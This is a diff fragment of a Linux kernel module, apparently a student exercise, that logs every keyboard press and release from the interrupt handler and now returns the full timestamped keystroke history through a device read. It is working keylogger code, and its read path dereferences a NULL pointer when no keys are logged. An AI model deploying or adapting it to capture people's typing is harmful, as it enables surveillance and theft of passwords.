@@ -159,25 +159,62 @@ irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
 			tmp = tmp->next;
 		tmp->next = new;
 	}
-	printk("[%d:%d:%d] %s (%s%#x) %s\n", \
+	/*printk("[%d:%d:%d] %s (%s%#x) %s\n", \
 			new->time.tm_hour, new->time.tm_min, new->time.tm_sec, \
 			new->name, \
 			new->multi ? "0xe0, " : "", new->key, \
-			new->state ? "pressed" : "released");
+			new->state ? "pressed" : "released");*/
 	multi = 0;
 
 end:
 	return (irq_handler_t) IRQ_HANDLED;
 }
 
+static char	*ft_strjoin(char *s1, char *s2)
+{
+	char	*new;
+	size_t	i;
+	size_t	j;
+
+	i = 0;
+	j = 0;
+	s1 ? i = strlen(s1) : 0;
+	s2 ? j = strlen(s2) : 0;
+	new = (char *)kmalloc(sizeof(char) * (i + j + 1), GFP_KERNEL);
+	if (!new)
+		return (NULL);
+	s1 ? strcpy(new, (char *)s1) : 0;
+	s2 ? strcpy(new + i, (char *)s2) : 0;
+	return (new);
+}
+
+
 static ssize_t long_read(struct file *f, char __user *s, size_t n, loff_t *o)
 {
 	struct s_stroke *tmp;
+	static char buf[256] = {0};
+	static char *ptr, *t;
+	int ret = -EFAULT, rmode = 0;
 
 	tmp = stroke_head;
-	while (tmp)
+	ptr = NULL;
+	while (!rmode && tmp) {
+		snprintf(buf, 256, "[%d:%d:%d] %s (%s%#x) %s\n", \
+			tmp->time.tm_hour, tmp->time.tm_min, tmp->time.tm_sec, \
+			tmp->name, \
+			tmp->multi ? "0xe0, " : "", tmp->key, \
+			tmp->state ? "pressed" : "released");
+		t = ptr;
+		if (!(ptr = ft_strjoin(ptr, buf)))
+			goto out;
+		kfree(t);
 		tmp = tmp->next;
-	return simple_read_from_buffer(s, n, o, tmp->name, strlen(tmp->name));
+	}
+	ret = simple_read_from_buffer(s, n, o, ptr, strlen(ptr));
+	rmode = ret ? 1 : 0;
+	kfree(ptr);
+out:
+	return ret;
 }
 
 struct file_operations kbfops = {
